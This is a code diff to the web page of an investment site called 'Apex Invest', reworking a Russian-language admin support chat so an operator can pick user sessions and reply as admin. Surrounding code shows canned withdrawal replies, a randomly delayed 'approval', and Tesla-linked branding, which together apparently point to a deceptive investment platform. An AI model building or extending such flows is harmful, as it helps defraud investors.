@@ -827,6 +827,7 @@
         <p>&copy; 2026 Apex Invest. Architecting the future alongside Tesla Vision.</p>
     </footer>
 
+    <!-- Scripts -->
     <script>
         const SUPABASE_URL = 'https://bycfzzqpnnsqgwtzccdc.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_sYHXSnwWJgT178wtP8MISA_t7A030f2';
@@ -924,20 +925,28 @@
             }
         }
 
-        function loadAllUserChatsForAdmin() {
+        async function loadAllUserChatsForAdmin() {
             const dropdown = document.getElementById('userChatDropdown');
             if (!dropdown) return;
-            dropdown.innerHTML = '<option value="">-- Выберите чат пользователя --</option>';
 
-            for (let i = 0; i < localStorage.length; i++) {
-                let key = localStorage.key(i);
-                if (key && key.startsWith('chat_history_')) {
-                    let userChatId = key.replace('chat_history_', '');
-                    let option = document.createElement('option');
-                    option.value = userChatId;
-                    option.innerText = '💬 Чат: ' + userChatId;
-                    dropdown.appendChild(option);
+            try {
+                let response = await fetch('/api/chat/sessions');
+                let result = await response.json();
+                
+                if (result.status === 'success') {
+                    dropdown.innerHTML = '<option value="">-- Выберите чат пользователя --</option>';
+                    result.sessions.forEach(sessionId => {
+                        let option = document.createElement('option');
+                        option.value = sessionId;
+                        option.innerText = '💬 Чат: ' + sessionId;
+                        if (sessionId === currentActiveUserSession) {
+                            option.selected = true;
+                        }
+                        dropdown.appendChild(option);
+                    });
                 }
+            } catch (e) {
+                console.error('Error loading admin chat sessions:', e);
             }
         }
 
@@ -948,6 +957,7 @@
         }
 
         async function loadChatHistory(sessionId) {
+            if (!sessionId) return;
             try {
                 let response = await fetch(`/api/chat/get?session_id=${sessionId}`);
                 let result = await response.json();
@@ -964,7 +974,7 @@
             if (!container) return;
             container.innerHTML = '';
 
-            if (messages.length === 0) {
+            if (messages.length === 0 && !isBinarpokAdmin) {
                 messages.push({
                     sender: 'support',
                     text: '👨‍💻 Поддержка: 💰 **Как вывести средства:** 1. Перейдите в раздел Dashboard. 2. Убедитесь, что ваш KYC пройден. 3. Нажмите «Request Withdrawal» (от $10).\n\nВаша проблема решена?',
@@ -987,7 +997,7 @@
 
                 div.innerHTML = contentHtml;
 
-                if (item.show_buttons) {
+                if (item.show_buttons && !isBinarpokAdmin) {
                     const btnBox = document.createElement('div');
                     btnBox.className = 'chat-action-buttons';
                     btnBox.innerHTML = `
@@ -1029,7 +1039,11 @@
             const action = actionOverride || null;
 
             if (!text && !selectedImageBase64 && !action) return;
-            if (!currentActiveUserSession && !isBinarpokAdmin) return;
+            
+            if (isBinarpokAdmin && !currentActiveUserSession) {
+                showCustomAlert('Пожалуйста, выберите чат пользователя из списка сверху!', 'Внимание');
+                return;
+            }
 
             if (input) input.value = '';
 
@@ -1041,7 +1055,8 @@
                         session_id: currentActiveUserSession,
                         message: text,
                         image: selectedImageBase64,
-                        action: action
+                        action: action,
+                        sender: isBinarpokAdmin ? 'admin' : 'user'
                     })
                 });
                 let result = await response.json();
@@ -1295,7 +1310,6 @@
             }
 
             let userData = getCleanUserData(localStorage.getItem('user_data_' + email));
-
             let randomDelay = Math.floor(Math.random() * (180000 - 60000 + 1)) + 60000;
             let approveTime = Date.now() + randomDelay;
 
